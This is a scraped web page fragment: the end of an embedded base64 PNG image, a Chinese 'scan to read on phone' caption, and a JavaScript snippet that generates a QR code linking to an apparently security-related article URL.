DQQ8yUwNHM/2+ohmVl85WK9VtYnBNdmLcJUL36P0snDyq4HXqJrE4Dwc/1ZSe/RxrasxsP93hI83+2g3JJPM/mocXgh+Mq5ppOttpg0XhHXfaNKzxuGFyYH7iVtZtMmDa4BQDYHlH3tN9OXAqF2tFV7YBvLVZ8OLT6ANBDxROONsf5qkrObExcB9ogHHyQvBXDTXEKxVnQwcw4GpB3OJg6qLwW1NrUsM89rkhVlHfgxu17WBpGjja0+gvXWSiQavbQs8aTBGC47heNWR3AxXa4H7JN8jODfrt+JS3+fDgfvBiNH0dfJnPIz1cOZUK6v1cOj2DdEJvZHtgVwdxu8n21sndelcqx6j6Tn54CuXvBBGTvw1Uy/ZTAPnftKtrNaDa2HEqu1jsD5c1oMzr3xyFZWrBq6Pts/vG9Kfxhv47Zc6eGpwP2b/mXSPyVWEo/8qFx4ObXonF4RDEy5YaxL3uNKGF8KxBlx/wQLWqu5e6/ezb8i9p/ZLujaQfkq3/NXewE8HjE/RrOeqT7SrfM9HK+z53ldO1nPxxcvAew8/Q+lksNYqL5vVrzhwP2C/ufjxZh/thmRfcEwLzn40FcE6PRkxMLfSgvNAlUxj4PTGHjiGEdMAnEs8Q7Am++41lYO1FpyDM/b94qcvWBteOAxE5LbXncAeyOvOfrrytw4EfAVh/KWe1XNde0zuGZz1CZd+4H0lFsLIib9m6QuuTTzDWZ/owPUzzbcOZLbA5h47gR8bCPgpqE8FmIcDs+VoEz+Ktb7Gfb9ruejAe7wVg3VwYPr3CM6nX5+L/2MDyaIbHzuBYSCZ1AxXraOd5eH8VMw04eC29pm1ZjVwXgvOsfZU6xLfg6p/xoaBPNNk13zfCbSBgJ8QuI33LF+fotRUXnHNJe5ROhl4f/Jl4BiOV3Zgrq+XD+YBhRdTD9kl+PwiP/YZXj5rfCHLF+DyhysYkwbHcOwv/cC5aIVtIAq2vf4E9kBeP4PTDv4HAAD//y3TIVMAAAAGSURBVAMA9NXehi9E08EAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-ContractManager-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 